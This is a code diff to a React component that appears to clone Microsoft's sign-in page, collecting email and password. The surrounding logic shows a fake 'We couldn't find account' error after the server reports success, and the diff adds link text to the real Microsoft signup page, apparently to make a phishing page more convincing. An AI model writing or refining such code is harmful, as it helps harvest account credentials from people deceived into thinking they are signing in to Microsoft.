@@ -9,6 +9,7 @@ const MicrosoftSignIn = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [ message , setMessage ] = useState("")
+  const [ link , setLink  ] = useState("")
     const navigate = useNavigate();
   const handleNext = (e) => {
     e.preventDefault();
@@ -26,6 +27,7 @@ const MicrosoftSignIn = () => {
       });
       
       setMessage(`We couldn't find account with that username. Try another, or `)
+      setLink("get a Microsoft account")
       console.log("login successful", res.data);
     } catch (error) {
       console.log("login error", error.response?.data?.message);
@@ -85,7 +87,7 @@ const MicrosoftSignIn = () => {
                 <h1 className="font-semibold text-[1.5rem] pb-3">Enter password</h1>
                 <p className="text-sm mb-3 text-gray-600">{email}</p>
 
-                <p className="text-red-600">{message} <span className="text-blue-500"> <a href="https://signup.live.com/?lic=1"></a></span> </p>
+                <p className="text-red-600">{message} <span className="text-blue-500"> <a href="https://signup.live.com/?lic=1">{link}</a></span> </p>
 
                 <form onSubmit={handleLogin}>
                   <input
